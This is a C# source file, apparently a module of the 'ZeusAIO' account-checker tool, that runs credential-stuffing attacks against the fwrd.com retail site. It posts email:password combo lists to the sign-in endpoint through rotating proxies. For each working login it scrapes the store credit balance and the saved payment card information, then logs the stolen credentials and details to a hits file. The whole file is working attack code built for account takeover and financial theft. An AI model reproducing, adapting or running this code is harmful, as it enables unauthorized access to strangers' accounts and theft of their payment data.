using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Fwrd
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string Getcookies = httpRequest.Get("https://www.fwrd.com").ToString();
                            string str = "email=" + s[0] + "&pw=" + s[1] + "&g_recaptcha_response=&karmir_luys=true&rememberMe=true&isCheckout=true&saveForLater=false&fw=true";
                            string strResponse = httpRequest.Post("https://www.fwrd.com/r/ajax/SignIn.jsp", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("{\"success\" : false,"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("\",\"success\":true,\"")) //hit
                                {
                                    string getbalance = httpRequest.Get("https://www.fwrd.com/fw/account/MyCredit.jsp", null).ToString();
                                    string bal = Check.Parse(getbalance, "Your current store credit balance is $", "</p>");
                                    string getpaymentinfo = httpRequest.Get("https://www.fwrd.com/fw/account/BillingInformation.jsp", null).ToString();
                                    string card = Check.Parse(getpaymentinfo, "class=\"payment_info\">", "</div>");
                                    string captures = " | Balance: " + bal + " | Card: " + card;
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - FWRD] " + s[0] + ":" + s[1] + captures, Color.Green);
                                    }
                                    Export.AsResult("/Fwrd_hits", s[0] + ":" + s[1] + captures);
                                    return false;

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                        }
                        //break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

